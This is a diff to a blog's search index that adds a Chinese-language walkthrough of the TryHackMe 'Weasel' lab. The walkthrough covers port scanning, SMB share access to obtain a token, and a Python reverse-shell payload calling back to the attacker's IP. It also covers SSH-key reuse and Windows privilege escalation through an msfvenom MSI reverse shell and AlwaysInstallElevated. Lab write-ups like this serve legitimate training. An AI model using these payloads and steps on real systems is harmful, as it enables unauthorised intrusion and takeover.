@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>Weasel on Tryhackme</title>
+      <link href="/2024/03/04/weasel/"/>
+      <url>/2024/03/04/weasel/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>我想睡qqqq<br>🐳…<br>Victim’s IP : 10.10.254.66<br>Attacker’s IP : 10.9.195.189</p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong><br>從今天開始我變成<code>rustscan</code>的信徒orz  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a  10.10.254.66 --<span class="built_in">ulimit</span> 5000 -- -sC -sV</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkhkoLQp6.png" alt="image">  </p><p><strong>Result</strong><br>有開ssh(22), http(8888), smb(445), 3389(rdp)  </p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>先進去 port 8888逛逛<br><img src="https://hackmd.io/_uploads/S1JDpU7TT.png" alt="image">  </p><p>進去網站後會發現一個<code>token</code>，所以要先找出token是什麼。  </p><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p>無法用一般的USERS當磁碟塊去連(<br>採用工具<code>smbmap</code>掃出磁碟名稱：<br><strong>Command</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.254.66 -u <span class="string">&quot;guest&quot;</span></span><br></pre></td></tr></table></figure><p><strong>Result</strong>  </p><p><img src="https://hackmd.io/_uploads/B1WwhI7Ta.png" alt="image">  </p><p>利用<code>smbclient</code>進行連線：<br><strong>Command</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.254.66\\datasci-team</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/S1QeTIXpT.png" alt="image">  </p><p><img src="https://hackmd.io/_uploads/rkJLpIm6T.png" alt="image"><br>成功拿到Token!!!  </p><h4 id="web-exploitation"><a href="#web-exploitation" class="headerlink" title="web exploitation"></a>web exploitation</h4><p>拿到Token後進去，跑個python reverse shell直接RCE~<br><img src="https://hackmd.io/_uploads/ByM10IX6T.png" alt="image"><br><strong>payload</strong>  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.9.195.189&quot;</span>,<span class="number">1004</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="WSL-to-Windows"><a href="#WSL-to-Windows" class="headerlink" title="WSL to Windows"></a>WSL to Windows</h4><p><img src="https://hackmd.io/_uploads/r1jSkDXap.png" alt="image"><br>確認一下剛剛拿到的RCE，發現在WSL裡面…<br>看到可以檔案(由 ED25519 結尾，合理推斷是SSH KEY)<br>把內容都丟到<code>rsa-ssh</code>的檔案裡，透過ssh進行連線：<br><strong>command</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh dev-datasci-lowpriv@10.10.254.66 -i rsa-ssh</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rku3kDXpa.png" alt="image"><br>好欸成功!!!  </p><h4 id="User-to-System"><a href="#User-to-System" class="headerlink" title="User to System"></a>User to System</h4><p>接下來的目標就是變成：<code>nt authority\system</code><br>所需要打到機器裡的腳本都是使用在本地的python http server處理。<br><strong>PrivescCheck</strong><br>PrivescCheck就是一個可以在windows上以現在的權限取得相關資訊的工具，而在這次的靶機中是為了取得密碼以及獲得提權立足點資訊：<br><a href="https://github.com/itm4n/PrivescCheck">Github 連結</a>  </p><p>使用者密碼：  </p><p><img src="https://hackmd.io/_uploads/SJHb-PXTp.png" alt="image">  </p><p>立足點：<br>AlwaysInstallElevated，這個設定會讓使用者可以下載MSI後以提權後的角色執行。<br><a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path">https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path</a></p><p><img src="https://hackmd.io/_uploads/rkok-vmpp.png" alt="image">  </p><p>本地生成MSI reverse shell：<br><strong>Command</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=8443 -f msi -o ./x64winreverse.msi --encoder x64/xor --<span class="built_in">arch</span> x64 --iteration 9</span><br></pre></td></tr></table></figure><p>接著在靶機中執行：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:dev-datasci-lowpriv <span class="string">&quot;msiexec /i C:\Users\dev-datasci-low</span></span><br><span class="line"><span class="string">priv\Downloads\x64winreverse.msi /qn&quot;</span></span><br></pre></td></tr></table></figure><p>最後輸入剛剛透過PrivescCheck獲得的密碼即可。  </p><p><img src="https://hackmd.io/_uploads/H1IGMPXa6.png" alt="image">  </p><p>監聽端口：<br><img src="https://hackmd.io/_uploads/H1oeMP7pp.png" alt="image">  </p><p>提權成功!!!  </p><h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了現在，這台機器讓我多學了一個windows提權，開心owob<br><em>p.s.其實我一開始是打 WinPEAS進去，抓到奇怪的process在python3.10，應該可以提權。但是我不會打(可能透過msfconsole(?))</em>  </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Windows </tag>
+            
+            <tag> Pentesting </tag>
+            
+            <tag> TryHackMe </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Attacktive Directory on Tryhackme</title>
       <link href="/2024/03/03/Attack-Directory/"/>
       <url>/2024/03/03/Attack-Directory/</url>
@@ -711,11 +734,11 @@
             
             <tag> Classical cipher </tag>
             
-            <tag> GOT Hijacking </tag>
-            
             <tag> SunShine CTF </tag>
             
             <tag> Forensics </tag>
+            
+            <tag> GOT Hijacking </tag>
             
             <tag> Scripting </tag>
             
@@ -744,11 +767,11 @@
             
             <tag> pwn </tag>
             
+            <tag> GOT Hijacking </tag>
+            
             <tag> ret2code </tag>
             
             <tag> ret2lib </tag>
-            
-            <tag> GOT Hijacking </tag>
             
             <tag> format string </tag>
             
